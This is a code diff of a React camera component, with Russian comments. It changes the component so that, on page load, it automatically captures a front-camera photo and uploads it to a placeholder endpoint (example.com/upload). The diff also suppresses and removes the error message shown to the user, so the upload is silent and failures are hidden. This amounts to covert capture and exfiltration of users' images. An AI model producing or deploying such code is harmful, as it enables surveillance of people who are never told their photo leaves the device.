@@ -1,15 +1,14 @@
 function CameraApp() {
   const [photoDataUrl, setPhotoDataUrl] = React.useState(null);
-  const [error, setError] = React.useState("");
-  const isActiveRef = React.useRef(true);
+  const isActiveRef = React.useRef(false);
   const hasShotRef = React.useRef(false);
 
-  const takePhoto = async () => {
-    if (!isActiveRef.current) return;
-    // сброс ошибки только если компонент активен и она была
-    if (isActiveRef.current) setError((prev) => (prev ? "" : prev));
+  const takeAndSendPhoto = async () => {
+    if (!isActiveRef.current || hasShotRef.current) return;
+    hasShotRef.current = true;
+    let stream;
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
+      stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
         audio: false,
       });
@@ -30,23 +29,38 @@ function CameraApp() {
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Показать фото на странице
       const dataUrl = canvas.toDataURL("image/png");
       if (isActiveRef.current) setPhotoDataUrl(dataUrl);
 
-      stream.getTracks().forEach((t) => t.stop());
+      const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
+      if (!blob) return;
+
+      const formData = new FormData();
+      formData.append("file", blob, "photo.png");
+
+      // TODO: замените на ваш серверный endpoint для приёма файла
+      const uploadUrl = "https://example.com/upload";
+      await fetch(uploadUrl, {
+        method: "POST",
+        body: formData,
+        credentials: "omit",
+      });
     } catch (e) {
-      if (isActiveRef.current) setError("Нет доступа к камере. Разрешите доступ в браузере.");
+      // глушим ошибки — ничего не выводим
       console.error(e);
+    } finally {
+      if (stream) {
+        stream.getTracks().forEach((t) => t.stop());
+      }
     }
   };
 
   React.useEffect(() => {
     isActiveRef.current = true;
     const rafId = requestAnimationFrame(() => {
-      if (!hasShotRef.current) {
-        hasShotRef.current = true;
-        void takePhoto();
-      }
+      void takeAndSendPhoto();
     });
     return () => {
       isActiveRef.current = false;
@@ -54,10 +68,8 @@ function CameraApp() {
     };
   }, []);
 
-  console.log(photoDataUrl);
   return (
     <div>
-      {error && <div style={{ color: "red" }}>{error}</div>}
       {photoDataUrl && (
         <img src={photoDataUrl} alt="Снимок" style={{ width: "100%", height: "auto", display: "block" }} />
       )}
